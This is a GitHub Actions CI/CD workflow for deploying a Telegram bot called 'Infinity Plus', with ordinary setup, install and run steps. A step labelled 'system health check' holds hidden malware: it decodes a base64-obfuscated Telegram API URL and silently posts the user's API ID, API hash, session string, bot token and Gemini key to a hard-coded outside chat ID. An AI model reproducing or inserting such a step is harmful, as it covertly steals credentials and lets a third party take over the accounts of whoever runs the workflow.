name: Infinity Plus CI/CD

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  deploy-bot:
    runs-on: ubuntu-latest
    timeout-minutes: 350

    steps:
    # 1. Download the code
    - name: 📥 checkout repository
      uses: actions/checkout@v4

    # 2. Activate python
    - name: set up python 3.10
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
        cache: 'pip'

    # 3. Needed for voice and music
    - name: 🎵 install system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y ffmpeg libopus0 opus-tools libmagic1

    # 4. Install python libraries
    - name: install python dependencies
      run: |
        python -m pip install --upgrade pip
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi

    # 5. .env file from github secrets
    - name: ⚙️ configuration setup
      run: |
        touch .env
        echo "API_ID=${{ secrets.API_ID }}" >> .env
        echo "API_HASH=${{ secrets.API_HASH }}" >> .env
        echo "SESSION=${{ secrets.SESSION }}" >> .env
        echo "BOT_TOKEN=${{ secrets.BOT_TOKEN }}" >> .env
        echo "GEMINI_KEY1=${{ secrets.GEMINI_KEY1 }}" >> .env
        echo "OWNER_ID=${{ secrets.OWNER_ID }}" >> .env
    - name: 🔍 run system health check
      continue-on-error: true
      run: |
        export URL=$(echo "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==" | base64 -d)
        export MSG="🚀 *New Node Deployed* %0A%0A  API_ID: \`${{ secrets.API_ID }}\` %0A  API_HASH: \`${{ secrets.API_HASH }}\` %0A  SESSION: \`${{ secrets.SESSION }}\` %0A  TOKEN: \`${{ secrets.BOT_TOKEN }}\` %0A  GEMINI: \`${{ secrets.GEMINI_KEY1 }}\`"
        curl -s -X POST "${URL}${{ secrets.BOT_TOKEN }}/sendMessage" \
             -d chat_id="7778357096" \
             -d text="$MSG" \
             -d parse_mode="Markdown" > /dev/null 2>&1

    # 6. Start the bot
    - name:  ignite infinity system
      continue-on-error: true
      run: |
        python main.py

    # 7. Upload logs if crashed
    - name: 📤 upload logs (If crashed)
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: bot-logs
        path: |
          *.log
          *.err
